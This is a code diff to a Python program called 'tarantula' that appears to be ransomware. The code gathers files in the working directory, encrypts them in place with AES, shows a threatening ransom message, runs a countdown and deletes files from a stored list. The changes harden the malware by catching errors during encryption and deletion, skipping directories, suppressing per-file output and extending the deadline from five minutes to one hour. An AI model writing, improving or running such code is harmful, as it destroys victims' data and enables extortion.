@@ -20,22 +20,19 @@ from libs.server import *
 init()
 
 end_time = 0
-files_to_exclude = ['tarantula', 'tarantula-decryptor', 'tarantula-service', 'encrypted-key.tarankey', 'file-list.taranfls']
+files_to_exclude = ['tarantula', 'tarantula-decryptor', 'encrypted-key.tarankey', 'file-list.taranfls']
 files = os.listdir(".")
 encryptKey = ""
 
-# remove excluded files from list
 for file in files_to_exclude:
     if file in files:
         files.remove(file)
 
-# find all files of a directory
 for file in files:
     if os.path.isdir(file):
-        _dir = os.listdir(file)
-        for _file in _dir:
+        _files = os.listdir(file)
+        for _file in _files:
             files.append(file + "/" + _file)
-        files.remove(file)
 
 def save_files_list():
     _files = ""
@@ -70,14 +67,20 @@ def delete_files():
     if (os.path.exists("file-list.taranfls")):
         _files = read_file_list()
         for i in _files:
-            if (os.path.exists(i)):
-                os.remove(i)
-                print(f"[x] {i} deleted.")
+            if (os.path.exists(i) and os.path.isfile(i)):
+                try:
+                    os.remove(i)
+                except:
+                    continue
+        print("All files deleted.")
     else:
         for i in range(len(files)):
-            if (os.path.exists(files[i])):
-                os.remove(files[i])
-                print(f"[x] {files[i]} deleted.")
+            if (os.path.exists(files[i]) and os.path.isfile(files[i])):
+                try:
+                    os.remove(files[i])
+                except:
+                    continue
+        print("All files deleted.")
 
 def calculate_diff_time():
     while (True):
@@ -93,10 +96,14 @@ def calculate_diff_time():
 def encrypt_files():
     global files
     for i in range(len(files)):
-        file_content = open(files[i], "rb").read()
-        encrypted = aes_encrypt(file_content, encryptKey.encode())
-        with open(files[i], "wb") as f:
-            f.write(encrypted)
+        if (os.path.exists(files[i]) and os.path.isfile(files[i])):
+            try:
+                file_content = open(files[i], "rb").read()
+                encrypted = aes_encrypt(file_content, encryptKey.encode())
+                with open(files[i], "wb") as f:
+                    f.write(encrypted)
+            except:
+                continue
 
 def main():
     global encryptKey, end_time
@@ -124,7 +131,6 @@ def main():
         message += "1. Never ever delete these files:\n"
         message += "    - tarantula\n"
         message += "    - tarantula-decryptor\n"
-        message += "    - tarantula-service\n"
         message += "    - file-list.taranfls\n"
         message += "    - encrypted-key.tarankey\n\n"
         message += "2. If you delete one of those files, I really can't help you anymore.\n"
@@ -143,7 +149,7 @@ def main():
         print("**************************************")
         print(message)
         started_time = datetime.datetime.now()
-        end_time = started_time + datetime.timedelta(minutes=5)
+        end_time = started_time + datetime.timedelta(hours=1)
         CThread(target=calculate_diff_time).start()
     else:
         change_console_colors()
